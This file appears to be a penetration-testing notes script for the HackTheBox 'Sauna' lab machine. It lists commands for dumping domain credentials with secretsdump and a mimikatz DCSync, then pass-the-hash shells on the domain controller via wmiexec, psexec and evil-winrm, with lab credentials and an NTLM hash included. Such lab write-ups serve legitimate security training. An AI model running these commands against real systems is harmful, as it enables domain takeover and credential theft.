#! /bin/bash


# target string in the format [username]:[password]@[ip]
secretsdump.py 'svc_loanmgr:Moneymakestheworldgoround!@10.10.10.175'
# Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
# Using the DRSUAPI method to get NTDS.DIT secrets
# [*] Kerberos keys grabbed


# Mimikatz https://github.com/gentilkiwi/mimikatz/releases
# download the latest release from the release page, and upload the 64-bit binary to Sauna
*Evil-WinRM* PS C:\programdata> upload /opt/mimikatz/x64/mimikatz.exe    

# just run mimikatz.exe with the commands you want to run following it from the command line
*Evil-WinRM* PS C:\programdata> .\mimikatz 'lsadump::dcsync /domain:EGOTISTICAL-BANK.LOCAL /user:administrator' exit


# Impacket tool that gets a semi-interactive shell on a Windows target via WMI (Windows Management Instrumentation), instead of PsExec-style service creation — quieter/more OPSEC-friendly since it doesn't drop a binary on disk.
# -dc-ip 10.10.10.175 — tells Impacket where the Domain Controller is (needed for Kerberos/domain auth resolution).

# use stolen NTLM hash for the administrator account to get a remote command-execution shell on the DC via WMI, without needing the actual plaintext password.
wmiexec.py -hashes 'aad3b435b51404eeaad3b435b51404ee:d9485863c1e9e05851aa40cbb4ab9dff' -dc-ip 10.10.10.175 administrator@10.10.10.175


# Or PSExec to get a shell as SYSTEM:
psexec.py -hashes 'aad3b435b51404eeaad3b435b51404ee:d9485863c1e9e05851aa40cbb4ab9dff' -dc-ip 10.10.10.175 administrator@10.10.10.175

# Or I can even use EvilWinRM:
evil-winrm -i 10.10.10.175 -u administrator -H d9485863c1e9e05851aa40cbb4ab9dff

C:\Windows\system32>whoami
C:\users\administrator\desktop>type root.txt

